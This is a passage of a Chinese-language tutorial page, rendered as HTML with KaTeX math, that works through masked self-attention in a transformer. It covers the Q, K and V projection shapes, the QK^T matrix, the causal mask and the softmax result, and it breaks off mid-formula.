<p><strong>输入：</strong> 矩阵e=\begin{bmatrix}\begin{bmatrix}x_0 &amp; x_1 &amp; x_2\end{bmatrix}\end{bmatrix}，e.shape=(1,3,5)</p>
<p><strong>约定符号：</strong></p>























<table><thead><tr><th/><th>W_Q</th><th>W_K</th><th>W_V</th></tr></thead><tbody><tr><td>模拟中的形状</td><td>(5,2)</td><td>(5,2)</td><td>(5,2)</td></tr><tr><td>形式化的形状</td><td>(d_{model},d_q)</td><td>(d_{model},d_q)</td><td>(d_{model},d_v)</td></tr></tbody></table>
<p>将矩阵<code>e</code>分别通过W_Q，W_K，W_V线性变换得到Q，K，V矩阵，Q.shape=(3,2)，K.shape=(3,2)，V.shape=(3,2)</p>
<p>再通过公式SoftMax(Masked(QK^T))V计算得分</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd46d3916a3b4b968012b82b9547ee0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTkwMTkzMDUyNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891734&amp;x-signature=GHjsWaiF%2FOMzzAHlWJt98ceBE3M%3D" alt="image-20260205170031696.png" loading="lazy"/></p>
<p>这里的<code>我/我</code>表示两个token的相关性Q[我]*K[我]</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>01</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>02</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>12</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>22</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">QK^T = \begin{bmatrix} y_{00} &amp; y_{01} &amp; y_{02} \\ y_{10} &amp; y_{11} &amp; y_{12} \\ y_{20} &amp; y_{21} &amp; y_{22} \end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0858em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">01</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">02</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>22</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">Masked(QK^T) =\begin{bmatrix}y_{00} &amp; -\infty &amp; -\infty \\y_{10} &amp; y_{11} &amp; -\infty \\y_{20} &amp; y_{21} &amp; y_{22}\end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">∞</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">∞</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">∞</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>M</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>M</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>22</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mn>2</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">P=SoftMax(Masked(QK^T)) =\begin{bmatrix}p_{00} &amp; 0&amp;0 \\p_{10} &amp; p_{11} &amp; 0\\p_{20} &amp; p_{21} &amp; p_{22}\end{bmatrix}=\begin{bmatrix}p_0 \\ p1 \\ p2\end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10903em;">tM</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 